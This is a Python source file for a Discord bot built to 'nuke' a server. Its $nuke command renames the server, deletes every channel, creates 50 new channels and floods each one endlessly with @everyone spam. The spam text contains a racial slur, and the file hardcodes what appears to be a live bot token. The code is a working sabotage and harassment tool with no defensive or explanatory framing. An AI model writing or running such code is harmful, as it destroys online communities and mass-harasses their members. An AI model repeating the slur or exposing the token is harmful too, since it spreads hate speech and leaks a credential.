import discord
from discord.ext import commands
import random
import asyncio

from keep_alive import keep_alive #new

TOKEN = "MTQwNzk5NjY3MjMxNDk2NjAyNg.G0eCi3.RLjuxSA8FnQfC24S4BU-iRHfl7fHK0-_cZAaoQ"
SPAM_MESSAGE = "@everyone pheonix blazers on top niggers "
CHANNEL_NAME = "get-nuked-bozo"

keep_alive()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    guild = ctx.guild
    try:
        await guild.edit(name="NUKED SERVER")
    except:
        pass

    # delete all channels
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # create 50 new channels
    for i in range(50):
        new_channel = await guild.create_text_channel(CHANNEL_NAME)
        asyncio.create_task(spam_channel(new_channel))

async def spam_channel(channel):
    while True:
        try:
            await channel.send(SPAM_MESSAGE)
        except:
            pass
        await asyncio.sleep(0.5)

bot.run(TOKEN)
